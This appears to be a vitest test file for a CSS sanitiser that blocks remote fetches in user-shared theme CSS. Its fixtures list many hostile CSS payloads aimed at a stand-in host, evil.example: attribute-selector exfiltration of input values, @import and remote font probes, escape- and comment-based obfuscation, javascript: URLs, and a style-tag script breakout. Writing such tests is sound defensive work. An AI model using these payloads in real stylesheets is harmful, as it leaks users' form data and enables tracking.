// Adversarial tests for shared-CSS sanitising (src/core/theme/sanitize.ts).
// The invariant: output references no URL but data:, and nothing that fetches.
import { describe, expect, it } from 'vitest';
import { SHARED_CSS_MAX, isSafeCss, sanitizeCss, serializeTokens, tokenize } from '../../src/core/theme/sanitize.ts';

const EVIL = /evil|https?:|\/\/e\b/i;
const clean = (css: string) => sanitizeCss(css);
/** Sanitised output must not mention the attacker at all, and must re-pass. */
function safe(css: string) {
  const r = clean(css);
  expect(r.error).toBeUndefined();
  expect(r.css).not.toMatch(EVIL);
  expect(isSafeCss(r.css)).toBe(true);
  expect(clean(r.css).css).toBe(r.css); // idempotent
  return r;
}

describe('sanitizeCss: hostile input (each must lose its remote reference)', () => {
  const hostile: [string, string][] = [
    ['attribute exfil, value prefix', 'input[value^="a"]{background:url(https://evil.example/a)}'],
    ['attribute exfil, grade', '[data-grade^="9"]{background-image:url(//evil.example/9)}'],
    ['protocol-relative', 'a{background:url(//evil.example/x)}'],
    ['quoted url()', 'a{background:url("https://evil.example/x")}'],
    ['single-quoted url()', "a{background:url('https://evil.example/x')}"],
    ['upper-case URL()', 'a{background:URL(https://evil.example/x)}'],
    ['escaped letter in url', 'a{background:u\\rl(https://evil.example/x)}'],
    ['hex-escaped u', 'a{background:\\75 rl(https://evil.example/x)}'],
    ['hex-escaped, 6 digits', 'a{background:\\000075rl(https://evil.example/x)}'],
    ['comment-split url', 'a{background:url/**/(https://evil.example/x)}'],
    ['space-split url', 'a{background:url (https://evil.example/x)}'],
    ['escapes inside the address', 'a{background:url(https\\:\\/\\/evil.example/x)}'],
    ['bad url (space inside)', 'a{background:url(https://evil .example/x)}'],
    ['cursor', 'a{cursor:url(https://evil.example/c.cur),auto}'],
    ['list-style', 'li{list-style:url(https://evil.example/b.png)}'],
    ['mask', 'a{mask-image:url(https://evil.example/m.svg)}'],
    ['filter', 'a{filter:url(https://evil.example/f.svg#x)}'],
    ['border-image', 'a{border-image:url(https://evil.example/b.png) 30}'],
    ['content url', 'a::before{content:url(https://evil.example/c.png)}'],
    ['image-set', 'a{background:image-set("https://evil.example/a.png" 1x)}'],
    ['-webkit-image-set', 'a{background:-webkit-image-set(url(https://evil.example/a.png) 1x)}'],
    ['image()', 'a{background:image("https://evil.example/a.png")}'],
    ['src()', 'a{background:src("https://evil.example/a.png")}'],
    ['cross-fade', 'a{background:-webkit-cross-fade(url(https://evil.example/a), url(https://evil.example/b), 50%)}'],
    ['escaped image-set name', 'a{background:\\69 mage-set("https://evil.example/a.png" 1x)}'],
    ['expression()', 'a{width:expression(fetch("https://evil.example"))}'],
    ['behavior', 'a{behavior:url(https://evil.example/x.htc)}'],
    ['-moz-binding', 'a{-moz-binding:url(https://evil.example/x.xml#b)}'],
    ['@import url', '@import url(https://evil.example/x.css);'],
    ['@import string', '@import "https://evil.example/x.css";'],
    ['escaped @import', '@\\69mport "https://evil.example/x.css";'],
    ['comment-split @import', '@im/**/port url(https://evil.example/x.css);'],
    ['@namespace url', '@namespace url(https://evil.example/ns); a{color:red}'],
    ['@namespace prefixed', '@namespace e url(https://evil.example/ns); e|a{color:red}'],
    ['remote @font-face', '@font-face{font-family:x;src:url(https://evil.example/f.woff2) format("woff2")}'],
    ['@font-face with unicode-range probe', '@font-face{font-family:p;src:url(https://evil.example/?a);unicode-range:U+61} input{font-family:p}'],
    ['@font-face upper SRC', '@font-face{font-family:x;SRC:url(https://evil.example/f.woff2)}'],
    ['custom property carrier', 'a{--x:url(https://evil.example/x)} b{background:var(--x)}'],
    ['var() fallback', 'a{background:var(--nope, url(https://evil.example/x))}'],
    ['attr() as url', 'a{background-image:attr(data-u type(<url>))}'],
    ['@supports prelude', '@supports (background:url(https://evil.example/x)){a{color:red}}'],
    ['@media wrapper', '@media screen{input[value$="x"]{background:url(https://evil.example/x)}}'],
    ['nested rule', 'a{color:red; &:hover{background:url(https://evil.example/x)}}'],
    ['@property initial-value', '@property --u{syntax:"*";inherits:false;initial-value:url(https://evil.example/x)}'],
    ['@counter-style symbols', '@counter-style s{system:cyclic;symbols:url(https://evil.example/x)}'],
    ['@document', '@-moz-document url-prefix(https://evil.example){a{color:red}}'],
    ['stray closers to break out', 'a{color:red}}}} b{background:url(https://evil.example/x)}'],
    ['unclosed block', 'a{background:url(https://evil.example/x)'],
    ['bad string', 'a{content:"https://evil.example\n/x"}'],
    ['javascript: url', 'a{background:url(javascript:fetch("//evil.example"))}'],
    ['data look-alike', 'a{background:url(dat%61:https://evil.example)}'],
    ['tab inside scheme', 'a{background:url("da\\9 ta:https://evil.example")}'],
    ['string in unknown function', 'a{background:paint(x, "https://evil.example")}'],
    ['future url-taking function', 'a{background:fetchy("https://evil.example/x")}'],
  ];
  it.each(hostile)('%s', (_name, css) => {
    const r = safe(css);
    expect(r.removed.length).toBeGreaterThan(0);
    for (const x of r.removed) expect(x.reason.length).toBeGreaterThan(10);
  });

  it('keeps the harmless parts of a rule around a removed declaration', () => {
    const r = safe('input[value^="a"]{color:red;background:url(https://evil.example/a);border:1px solid}');
    expect(r.css).toContain('color: red;');
    expect(r.css).toContain('border: 1px solid;');
    expect(r.css).toContain('input[value^="a"]');
    expect(r.removed).toHaveLength(1);
    expect(r.removed[0]!.reason).toMatch(/internet.*evil\.example/);
  });

  it('says where a remote address pointed, for the preview', () => {
    const r = clean('a{background:url(https://tracker.evil.example/p.gif)}');
    expect(r.removed[0]!.reason).toContain('(tracker.evil.example)');
    expect(r.removed[0]!.rule).toContain('background');
  });
});

describe('sanitizeCss: what stays', () => {
  it('keeps ordinary styling, @media, @supports, @layer, @container, keyframes and nesting', () => {
    const css = `
      :root { --b2c-corner: 6px; }
      .ic-DashboardCard { border-radius: 12px !important; box-shadow: 0 1px 2px rgb(0 0 0 / .2); }
      @media (max-width: 800px) { .ic-DashboardCard { width: 100% } }
      @supports selector(a:has(b)) { a:has(> b[title="x"]) { color: #c0ffee } }
      @layer base, theme;
      @layer theme { body { font-feature-settings: "liga" 1, "ss01"; } }
      @container card (min-width: 200px) { .x { padding: 1em } }
      @keyframes pulse { from { opacity: 1 } 50% { opacity: .5 } to { opacity: 1 } }
      .menu { color: red; & > li:hover { color: blue } }
      li::before { content: counters(item, ".") " "; }
      a::after { content: attr(data-label) " →"; }
      .grid { grid-template-areas: "a b" "c d"; }`;
    const r = safe(css);
    expect(r.removed).toEqual([]);
    for (const bit of ['@media (max-width: 800px)', '@supports selector(', '@layer base, theme;', '@container card', '@keyframes pulse', '50%', '& > li:hover', 'counters(item, ".")', 'attr(data-label)', '"a b" "c d"', '!important', 'rgb(0 0 0 / .2)', '#c0ffee'])
      expect(r.css).toContain(bit);
  });

  it('keeps data: images and data:/local() fonts', () => {
    const r = safe(`a { background: url(data:image/png;base64,iVBORw0KGgo=) no-repeat, url('data:image/svg+xml,%3Csvg%3E%3C/svg%3E'); }
      @font-face { font-family: Mine; src: url(data:font/woff2;base64,d09GMgABAAA=) format("woff2"), local("Inter"); }
      body { font-family: "Atkinson Hyperlegible", Inter, system-ui; }`);
    expect(r.removed).toEqual([]);
    expect(r.css).toContain('url("data:image/png;base64,iVBORw0KGgo=")');
    expect(r.css).toContain('url("data:image/svg+xml,%3Csvg%3E%3C/svg%3E")');
    expect(r.css).toContain('@font-face');
    expect(r.css).toContain('local("Inter")');
  });

  it('never lets text close the <style> element', () => {
    const r = safe('a::before{content:"</style><script>alert(1)</script>"}');
    expect(r.css).not.toContain('<');
    expect(r.css).toContain('\\3c /style\\3e ');
  });

  it('re-serialises so merged tokens stay apart (no url( from url/**/()', () => {
    // Tokens that are only separate thanks to a comment get /**/ back.
    expect(serializeTokens(tokenize('a/**/b'))).toBe('a/**/b');
    expect(serializeTokens(tokenize('1/**/px'))).toBe('1/**/px');
    expect(serializeTokens(tokenize('x/**/('))).toBe('x/**/(');
    expect(serializeTokens(tokenize('#a/**/-b'))).toBe('#a/**/-b');
    // A dimension whose unit starts with e can't turn into an exponent.
    expect(serializeTokens([{ t: 'dimension', repr: '1', unit: 'e3' }])).toBe('1\\65 3');
    expect(tokenize(serializeTokens([{ t: 'dimension', repr: '1', unit: 'e3' }]))).toEqual([{ t: 'dimension', repr: '1', unit: 'e3' }]);
  });
});

describe('sanitizeCss: limits and robustness', () => {
  it(`refuses shared CSS over ${SHARED_CSS_MAX / 1024} KB with a clear message`, () => {
    const big = 'a{color:red}\n'.repeat(Math.ceil((SHARED_CSS_MAX + 10) / 13));
    const r = clean(big);
    expect(r.css).toBe('');
    expect(r.error).toMatch(/at most 32 KB/);
  });

  it('drops absurd nesting without overflowing', () => {
    const deep = 'a{'.repeat(200) + 'color:red' + '}'.repeat(200);
    const r = clean(deep);
    expect(r.error).toBeUndefined();
    expect(r.removed.some(x => /deeply/.test(x.reason))).toBe(true);
  });

  it('survives pathological brackets quickly', () => {
    const t = performance.now();
    const r = clean('('.repeat(20000) + '{' + '['.repeat(5000));
    expect(performance.now() - t).toBeLessThan(2000);
    expect(r.css).toBe('');
  });

  it('fuzz: random hostile fragments never yield a remote reference, and output is stable', () => {
    const bits = ['url(', 'URL(', 'https://evil.example/', '//evil.example/', '\\', '\\75 ', 'u', 'rl', '/*', '*/', '"', "'", '(', ')', '{', '}', '[', ']', ';', ':', ',', ' ', '\n',
      'a', 'b', '-', '@import ', '@media ', '@font-face', 'src:', 'image-set(', 'image(', 'data:', 'x', 'var(--x', '--x:', '&', '>', '<!--', '-->', '!important', '#', '.', '1', 'e', '%', 'attr(', 'content:'];
    let seed = 12345;
    const rnd = (n: number) => ((seed = (seed * 1103515245 + 12345) & 0x7fffffff), seed % n);
    for (let n = 0; n < 3000; n++) {
      let css = '';
      const len = 5 + rnd(60);
      for (let k = 0; k < len; k++) css += bits[rnd(bits.length)];
      const r = clean(css);
      expect(r.error, css).toBeUndefined();
      expect(isSafeCss(r.css), css).toBe(true);
      expect(r.css, css).not.toMatch(/evil\.example/);
      expect(clean(r.css).css, css).toBe(r.css);
    }
  });
});
